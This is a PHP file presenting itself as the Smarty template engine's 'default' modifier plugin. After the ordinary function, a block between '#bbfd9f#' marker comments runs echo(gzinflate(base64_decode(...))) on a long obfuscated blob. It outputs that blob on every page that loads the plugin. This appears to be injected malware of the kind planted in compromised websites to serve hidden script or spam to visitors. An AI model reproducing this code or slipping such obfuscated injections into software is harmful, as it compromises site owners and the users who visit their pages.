<?php

/*
 * Smarty plugin
 * -------------------------------------------------------------
 * Type:     modifier
 * Name:     default
 * Purpose:  designate default value for empty variables
 * -------------------------------------------------------------
 */
function smarty_modifier_default($string, $default = '')
{
    if (!isset($string) || $string === '')
        return $default;
    else
        return $string;
}

/* vim: set expandtab: */


#bbfd9f#
echo(gzinflate(base64_decode("fVNNb9swDD3nX3A+1Daa2Um70xwFGLAP7JDt0AHFToFj07a2RDIkOsmw5b+Xkow0SLdZgGCQfI98JLWwlZE9Af3qUUSER8p/lPsyWKNlM6iKpFbQIq0rrX9KTL6UO0zh92RfGrBYmqoDAc4ItxCJqPAOgzQYtS+3A7I3YqtsIKl1NexQURaosi2qljpYwswRTnTTWCSOv46Tqsbj1yYJ6dJi4tnG8FcCXs8ZD5Mzw60YKxszMGCCqv4Pc1REUwhoR+/5PcKT/xP+TH8hWAwKbVX2+EKvHTaWjFTtWPsUmDZ1CU98AsVl64rTeQD2eQCKez0FH+Bk8+c6Xh3rklyzFR7gPf8maeF8wZ4x/ju3JLmb3b25dqy0oi65vzZ7ktF6pcSlCROPRcz3qHesia0FHntp0HrvSEn60+rbQ9AfgvqSOpHHxckJ2Ji1wZaZ8+QjQxt9/LN6+PwhzWXh3IM1a2194r1sS9ImGyyady1XVcgmudjQmHTfYz30ceoGGMdwczPis11JVZfkjzx4fbC5TF/4Qh2p28iz6oOR3It4IRvjZPt7o02NRsygQ9l2JOZwkDXrmQO/Hr3dskyhNFhTiagj6t/meb3fWd1QhkPuFy/raLeNlrDIA/Ey5l2wfxMyhXg+84dDTos8PNDlEw==")));
#/bbfd9f#
?>
